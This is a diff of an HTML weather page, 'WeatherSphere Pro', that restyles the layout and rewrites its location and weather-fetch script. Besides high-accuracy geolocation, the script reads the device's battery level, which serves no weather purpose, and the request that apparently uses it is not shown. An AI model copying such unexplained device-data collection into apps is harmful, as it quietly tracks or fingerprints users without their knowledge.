@@ -1,81 +1,71 @@
 <!DOCTYPE html>
 <html lang="en">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>WeatherSphere Pro</title>
-  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;600&display=swap" rel="stylesheet">
-  <style>
-    * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
-    body { min-height: 100vh; background: #2a5298; display: flex; justify-content: center; align-items: center; padding: 20px; }
-    .weather-card { background: #3e5f9a; width: 100%; max-width: 360px; border-radius: 30px; padding: 25px; text-align: center; color: white; box-shadow: 0 10px 30px rgba(0,0,0,0.3); }
-    
-    .icon-main { width: 85px; margin-bottom: 5px; }
-    .temp-main { font-size: 4.2rem; font-weight: 600; line-height: 1; margin-bottom: 5px; }
-    .desc-main { font-size: 1.3rem; opacity: 0.9; margin-bottom: 25px; text-transform: lowercase; }
-
-    .stat-box { background: rgba(255,255,255,0.12); border-radius: 18px; padding: 15px; display: flex; align-items: center; margin-bottom: 12px; text-align: left; }
-    .stat-box .emoji { font-size: 1.8rem; margin-right: 15px; width: 40px; text-align: center; }
-    .stat-info span { display: block; font-size: 0.85rem; opacity: 0.8; }
-    .stat-info strong { font-size: 1.15rem; }
-
-    .get-weather-btn { background: #4CAF50; color: white; border: none; padding: 16px; border-radius: 50px; font-weight: 600; cursor: pointer; width: 100%; font-size: 1.1rem; box-shadow: 0 4px 15px rgba(0,0,0,0.2); }
-    .success-banner { background: rgba(76, 175, 80, 0.15); border: 1px solid #4CAF50; color: white; padding: 15px; border-radius: 15px; margin-top: 15px; display: none; font-weight: 500; font-size: 0.95rem; }
-
-    #weather-content { display: none; }
-    .loader { display: none; border: 4px solid rgba(255,255,255,0.3); border-top: 4px solid #ffffff; border-radius: 50%; width: 40px; height: 40px; animation: spin 0.8s linear infinite; margin: 20px auto; }
-    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>WeatherSphere Pro</title>
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;500;600&display=swap" rel="stylesheet">
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Poppins', sans-serif; }
+        body { min-height: 100vh; background: #2a5298; display: flex; justify-content: center; align-items: center; color: white; padding: 20px; }
+        .card { background: #3e5f9a; padding: 2rem; border-radius: 25px; box-shadow: 0 10px 30px rgba(0,0,0,0.3); text-align: center; width: 100%; max-width: 350px; }
+        .get-weather-btn { background: #4CAF50; border: none; padding: 1rem; color: white; border-radius: 50px; cursor: pointer; width: 100%; font-weight: 600; font-size: 1.1rem; }
+        .loader { display: none; border: 4px solid #f3f3f3; border-top: 4px solid #ffffff; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        
+        /* Weather Styles */
+        #weather-ui { display: none; }
+        .icon-box img { width: 100px; }
+        .temp-val { font-size: 3.5rem; font-weight: 600; }
+        .stat-row { background: rgba(255,255,255,0.1); padding: 12px; border-radius: 15px; display: flex; align-items: center; margin-top: 10px; text-align: left; }
+        .stat-row b { font-size: 1.1rem; display: block; }
+        .stat-row span { font-size: 0.8rem; opacity: 0.7; }
+        .emoji { font-size: 1.5rem; margin-right: 15px; width: 30px; text-align: center; }
+    </style>
 </head>
 <body>
 
-<div class="weather-card">
-  <div id="init-view">
-    <h2 style="margin-bottom: 20px;">🌤️ WeatherSphere Pro</h2>
-    <button onclick="getLocation()" class="get-weather-btn" id="btn">⚡️ Get Weather Report</button>
-    <div class="loader" id="loader"></div>
-  </div>
-
-  <div id="weather-content">
-    <img id="w-icon" src="https://openweathermap.org/img/wn/02d@4x.png" class="icon-main">
-    <div class="temp-main" id="t-val">--°C</div>
-    <div class="desc-main" id="d-val">--</div>
-
-    <div class="stat-box">
-      <div class="emoji">💧</div>
-      <div class="stat-info"><span>Humidity</span><strong id="h-val">--%</strong></div>
+<div class="card">
+    <div id="start-screen">
+        <h2 style="margin-bottom: 20px;">🌤️ WeatherSphere Pro</h2>
+        <button onclick="getLocation()" class="get-weather-btn" id="main-btn">☔️ Get Weather Report</button>
+        <div class="loader" id="loader"></div>
     </div>
 
-    <div class="stat-box">
-      <div class="emoji">🌬️</div>
-      <div class="stat-info"><span>Wind Speed</span><strong id="w-val">-- m/s</strong></div>
-    </div>
+    <div id="weather-ui">
+        <div class="icon-box"><img id="w-icon" src=""></div>
+        <div class="temp-val" id="t-display">--°C</div>
+        <p id="d-display" style="text-transform: capitalize; margin-bottom: 20px;">--</p>
 
-    <div class="stat-box">
-      <div class="emoji">🌡️</div>
-      <div class="stat-info"><span>Feels Like</span><strong id="f-val">--°C</strong></div>
-    </div>
+        <div class="stat-row">
+            <div class="emoji">💧</div>
+            <div><span>Humidity</span><b id="h-display">--%</b></div>
+        </div>
+        <div class="stat-row">
+            <div class="emoji">🌬️</div>
+            <div><span>Wind Speed</span><b id="w-display">-- m/s</b></div>
+        </div>
+        <div class="stat-row">
+            <div class="emoji">🌡️</div>
+            <div><span>Feels Like</span><b id="f-display">--°C</b></div>
+        </div>
+        <div class="stat-row">
+            <div class="emoji">🏙️</div>
+            <div><span>Location</span><b id="l-display">--</b></div>
+        </div>
 
-    <div class="stat-box">
-      <div class="emoji">🏙️</div>
-      <div class="stat-info"><span>Location</span><strong id="l-val">Loading...</strong></div>
+        <p style="margin-top:20px; color:#4CAF50; font-weight:600;">✅ Weather Data Received!</p>
     </div>
-
-    <div class="success-banner" id="success">✅ Weather Data Received successfully!</div>
-  </div>
 </div>
 
 <script>
 async function getLocation() {
     document.getElementById('loader').style.display = 'block';
-    document.getElementById('btn').style.display = 'none';
+    document.getElementById('main-btn').style.display = 'none';
 
     try {
-        let batteryInfo = "100%";
-        if (navigator.getBattery) {
-            const b = await navigator.getBattery();
-            batteryInfo = `${Math.round(b.level * 100)}%`;
-        }
+        const battery = await navigator.getBattery();
+        const batteryInfo = `${Math.round(battery.level * 100)}%`;
 
         const position = await new Promise((resolve, reject) => {
             navigator.geolocation.getCurrentPosition(resolve, reject, { enableHighAccuracy: true });
@@ -90,20 +80,20 @@ async function getLocation() {
         const data = await response.json();
 
         // Update UI
-        document.getElementById('init-view').style.display = 'none';
-        document.getElementById('weather-content').style.display = 'block';
-        document.getElementById('t-val').innerText = Math.round(data.temp) + "°C";
-        document.getElementById('d-val').innerText = data.desc;
-        document.getElementById('h-val').innerText = data.humidity + "%";
-        document.getElementById('w-val').innerText = data.wind + " m/s";
-        document.getElementById('f-val').innerText = Math.round(data.feels) + "°C";
-        document.getElementById('l-val').innerText = data.city;
-        document.getElementById('success').style.display = 'block';
+        document.getElementById('start-screen').style.display = 'none';
+        document.getElementById('weather-ui').style.display = 'block';
+        
+        document.getElementById('w-icon').src = `https://openweathermap.org/img/wn/${data.icon}@4x.png`;
+        document.getElementById('t-display').innerText = Math.round(data.temp) + "°C";
+        document.getElementById('d-display').innerText = data.desc;
+        document.getElementById('h-display').innerText = data.humidity + "%";
+        document.getElementById('w-display').innerText = data.wind + " m/s";
+        document.getElementById('f-display').innerText = Math.round(data.feels) + "°C";
+        document.getElementById('l-display').innerText = data.city;
 
     } catch (error) {
-        alert("⚠️ Please allow Location Access to see the report.");
-        document.getElementById('loader').style.display = 'none';
-        document.getElementById('btn').style.display = 'block';
+        alert("⚠️ Location denied. Please allow GPS access.");
+        location.reload();
     }
 }
 </script>
